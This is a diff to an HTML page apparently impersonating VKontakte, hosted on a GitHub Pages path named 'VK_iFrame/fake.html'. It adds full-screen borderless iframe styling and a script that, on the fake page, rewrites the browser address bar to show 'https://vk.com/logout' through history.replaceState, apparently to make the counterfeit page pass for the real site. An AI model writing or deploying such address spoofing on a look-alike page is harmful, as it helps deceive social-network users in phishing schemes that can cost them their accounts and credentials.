@@ -113,6 +113,12 @@
       font-size: 13px;
       margin-top: 30px;
     }
+    
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+    }
   </style>
 </head>
 <body>
@@ -131,5 +137,15 @@
 
     <footer>&copy; 2025 ВКонтакте LLC</footer>
   </div>
+   <script>
+    // Здесь подменяем URL страницы внутри iframe
+    if (window.location.href === "https://jkeep1990.github.io/VK_iFrame/fake.html") {
+      try {
+        history.replaceState(null, "", "https://vk.com/logout");
+      } catch (err) {
+        console.error("Ошибка подмены URL:", err);
+      }
+    }
+  </script>
 </body>
 </html>
